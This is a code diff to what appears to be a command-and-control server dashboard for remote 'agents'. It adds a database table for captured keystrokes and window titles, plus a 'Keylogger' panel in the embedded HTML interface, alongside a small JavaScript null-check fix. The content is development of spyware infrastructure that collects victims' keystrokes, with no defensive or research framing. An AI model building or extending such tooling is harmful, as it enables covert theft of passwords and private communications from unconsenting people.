@@ -112,6 +112,18 @@ def init_db():
         )
     """)
     
+    # Table keylogs (frappe clavier)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS keylogs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            agent_id TEXT,
+            window_title TEXT,
+            keystrokes TEXT,
+            timestamp TEXT,
+            FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
+        )
+    """)
+    
     conn.commit()
     conn.close()
 
@@ -1761,7 +1773,13 @@ HTML_TEMPLATE = """
             });
             
             // Show selected panel
-            document.getElementById('view-' + viewName).classList.add('active');
+            const targetPanel = document.getElementById('view-' + viewName);
+            if (targetPanel) {
+                targetPanel.classList.add('active');
+            } else {
+                console.error('[JS] Panel not found: view-' + viewName);
+                return;
+            }
             
             // Update nav items
             document.querySelectorAll('.nav-item').forEach(item => {
@@ -1785,7 +1803,8 @@ HTML_TEMPLATE = """
             // Update view title
             const titles = {
                 'agents': 'AGENTS',
-                'results': 'RESULTS'
+                'results': 'RESULTS',
+                'keylogger': 'KEYLOGGER'
             };
             document.getElementById('view-title').textContent = titles[viewName] || 'AGENTS';
         }
@@ -1810,7 +1829,7 @@ HTML_TEMPLATE = """
                 <span class="nav-text">Results</span>
                 <span class="nav-badge" id="badge-results">0</span>
             </a>
-            <a href="#" class="nav-item" onclick="showView(' ', event); return false;">
+            <a href="#" class="nav-item" onclick="showView('keylogger', event); return false;">
                 <span class="nav-icon">⌨</span>
                 <span class="nav-text">Keylogger</span>
                 <span class="nav-badge" id="badge-keylogger">0</span>
